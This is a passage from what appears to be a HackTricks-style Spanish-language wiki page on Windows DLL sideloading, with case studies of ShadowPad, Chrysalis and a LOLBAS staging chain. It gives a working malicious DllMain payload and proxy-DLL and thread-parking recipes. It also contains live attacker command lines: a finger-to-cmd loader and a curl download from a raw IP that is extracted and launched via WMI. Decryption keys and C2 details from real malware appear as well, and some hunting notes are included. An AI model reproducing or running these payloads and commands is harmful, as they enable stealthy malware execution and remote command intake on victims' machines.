- Drop these two files in the same folder:
- wsc_proxy.exe: host legítimo firmado (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
- wsc.dll: DLL del atacante. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, construye una proxy DLL y reenvía los exports necesarios a la biblioteca genuina mientras ejecutas el payload en DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportación, usa un proxying framework (por ejemplo, DLLirant/Spartacus) para generar una DLL de forwarding que también ejecute tu payload.

- Esta técnica depende de la resolución del nombre de la DLL por parte del host binary. Si el host usa rutas absolutas o safe loading flags (por ejemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS y forwarded exports pueden influir en la precedencia y deben tenerse en cuenta durante la selección del host binary y del export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point describió cómo Ink Dragon despliega ShadowPad usando una **triada de tres archivos** para mezclarse con software legítimo mientras mantiene el core payload cifrado en disco:

1. **Signed host EXE** – se abusan vendors como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes renombran el ejecutable para que parezca un Windows binary (por ejemplo `conhost.exe`), pero la firma Authenticode sigue siendo válida.
2. **Malicious loader DLL** – se deja junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL suele ser un binary MFC ofuscado con el framework ScatterBrain; su única tarea es localizar el blob cifrado, descifrarlo y mapear ShadowPad de forma reflectiva.
3. **Encrypted payload blob** – a menudo se almacena como `<name>.tmp` en el mismo directorio. Tras hacer memory-mapping del payload descifrado, el loader elimina el archivo TMP para destruir la evidencia forense.

Notas de tradecraft:

* Renombrar el signed EXE (manteniendo el `OriginalFileName` original en el encabezado PE) le permite hacerse pasar por un Windows binary y conservar la firma del vendor, así que replica el hábito de Ink Dragon de soltar binarios con aspecto de `conhost.exe` que en realidad son utilidades AMD/NVIDIA.
* Como el ejecutable sigue siendo confiable, la mayoría de los controles de allowlisting solo necesitan que tu DLL maliciosa esté junto a él. Enfócate en personalizar la loader DLL; normalmente el parent firmado puede ejecutarse sin cambios.
* El decryptor de ShadowPad espera que el blob TMP esté junto al loader y sea writable para poder poner a cero el archivo después del mapping. Mantén el directorio escribible hasta que el payload cargue; una vez en memoria, el archivo TMP puede eliminarse de forma segura por OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Los operadores combinan DLL sideloading con LOLBAS para que el único artefacto custom en disco sea la DLL maliciosa junto al EXE confiable:

- **Remote command loader (Finger):** Hidden PowerShell lanza `cmd.exe /c`, toma comandos de un Finger server y los envía a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtiene texto por TCP/79; `| cmd` ejecuta la respuesta del server, permitiendo a los operadores rotar el server de la segunda etapa desde el lado del servidor.

- **Built-in download/extract:** Descarga un archive con una extensión benigna, lo desempaqueta y prepara el target del sideload junto a la DLL dentro de una carpeta aleatoria en `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta el progreso y sigue redirecciones; `tar -xf` usa el tar integrado de Windows.

- **WMI/CIM launch:** Inicia el EXE vía WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL colocada al lado:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona con binarios que prefieren DLL locales (por ejemplo, `intelbq.exe`, `nearby_share.exe`); el payload (por ejemplo, Remcos) se ejecuta bajo el nombre confiable.

- **Hunting:** Genera alertas sobre `forfiles` cuando `/p`, `/m` y `/c` aparecen juntos; es poco común fuera de scripts administrativos.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización confiable para entregar un dropper empaquetado con NSIS que preparó un DLL sideload más payloads totalmente en memoria.

Tradecraft flow
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca como **HIDDEN**, deja un Bitdefender Submission Wizard renombrado `BluetoothService.exe`, un `log.dll` malicioso y un blob cifrado `BluetoothService`, y luego lanza el EXE.
- El host EXE importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` hace mmap-load del blob; `LogWrite` lo descifra con un stream custom basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, material de clave derivado de un hash previo), sobrescribe el buffer con shellcode en texto plano, libera temporales y salta a él.
- Para evitar un IAT, el loader resuelve APIs hasheando nombres export usando **base FNV-1a 0x811C9DC5 + prime 0x1000193**, luego aplicando un Murmur-style avalanche (**0x85EBCA6B**) y comparándolo con hashes objetivo con salt.

Main shellcode (Chrysalis)
- Descifra un main module tipo PE repitiendo add/XOR/sub con la clave `gQ2JR&9;` durante cinco pasadas, y luego carga dinámicamente `Kernel32.dll` → `GetProcAddress` para terminar la resolución de imports.
- Reconstruye strings de nombres DLL en runtime mediante transformaciones por carácter de bit-rotate/XOR, y luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre el **PEB → InMemoryOrderModuleList**, analiza cada export table en bloques de 4 bytes con Murmur-style mixing, y solo recurre a `GetProcAddress` si el hash no se encuentra.

Embedded configuration & C2
- La config vive dentro del archivo `BluetoothService` dejado en **offset 0x30808** (tamaño **0x980**) y se descifra con RC4 usando la clave `qwhvb^435h&*7`, revelando la URL del C2 y el User-Agent.
- Los beacons construyen un perfil de host separado por puntos, anteponen la etiqueta `4Q`, y luego cifran con RC4 usando la clave `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Las respuestas se descifran con RC4 y se despachan mediante un switch de tags (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- El modo de ejecución está controlado por argumentos CLI: sin args = instala persistence (service/Run key) apuntando a `-i`; `-i` relanza a sí mismo con `-k`; `-k` omite la instalación y ejecuta el payload.

Alternate loader observed
- La misma intrusión dejó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` al lado. El source C proporcionado por el atacante incrustaba shellcode, compilaba y se ejecutaba en memoria sin tocar el disco con un PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta fase de compile-and-run basada en TCC importaba `Wininet.dll` en tiempo de ejecución y obtenía un second-stage shellcode desde una URL codificada en duro, proporcionando un loader flexible que se hacía pasar por una ejecución de compiler.

## Signed-host sideloading con export proxying + host thread parking

Algunas cadenas de DLL sideloading añaden **stability engineering** para que el host legítimo siga vivo el tiempo suficiente para cargar fases posteriores de forma limpia en lugar de crashear después de que se cargue la DLL maliciosa.

Patrón observado
- Coloca un EXE confiable junto a una DLL maliciosa usando el nombre de dependencia esperado, como `version.dll`.
- La DLL maliciosa **proxy every expected export** hacia la DLL real del sistema (por ejemplo `%SystemRoot%\\System32\\version.dll`) para que la resolución de importaciones siga funcionando y el host process continúe operando.
- Después de la carga, la DLL maliciosa **patches the host entry point** para que el main thread caiga en un bucle infinito de `Sleep` en lugar de salir o ejecutar code paths que terminarían el process.
- Un nuevo thread realiza el trabajo malicioso real: descifrar el nombre o path de la siguiente DLL stage (RC4/XOR son comunes) y luego lanzarla con `LoadLibrary`.

Por qué importa
- El proxying normal de DLL preserva la compatibilidad con la API, pero no garantiza que el host siga vivo el tiempo suficiente para fases posteriores.
- Mantener el main thread en `Sleep(INFINITE)` es una forma simple de conservar el signed process residente mientras el loader realiza descifrado, staging o bootstrap de red en un worker thread.
- Buscar solo un `DllMain` sospechoso puede pasar por alto este patrón si el comportamiento interesante ocurre después de que se parchea el host entry point y se inicia un secondary thread.

Flujo mínimo
1. Copia el signed host EXE y determina la DLL que resuelve desde el directorio local.
2. Construye una proxy DLL exportando las mismas funciones y reenviándolas a la DLL legítima.
3. En `DllMain(DLL_PROCESS_ATTACH)`, crea un worker thread.
4. Desde ese thread, parchea el host entry point o la rutina de inicio del main thread para que haga loop con `Sleep`.
5. Descifra el nombre/config de la siguiente DLL stage y llama a `LoadLibrary` o manual-map el payload.

Pivotes defensivos
- Signed processes cargando `version.dll` o bibliotecas similares comunes desde su propio directorio de aplicación en lugar de `System32`.
- Parches de memoria en el process entry point poco después de la carga de la imagen, especialmente jumps/calls redirigidos a `Sleep`/`SleepEx`.
- Threads creados por una proxy DLL que inmediatamente llaman a `LoadLibrary` sobre una segunda DLL con un nombre descifrado.
- Full-export proxy DLLs colocadas junto a ejecutables de vendor dentro de directorios de staging escribibles como `ProgramData`, `%TEMP%` o rutas de archivos descomprimidos.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
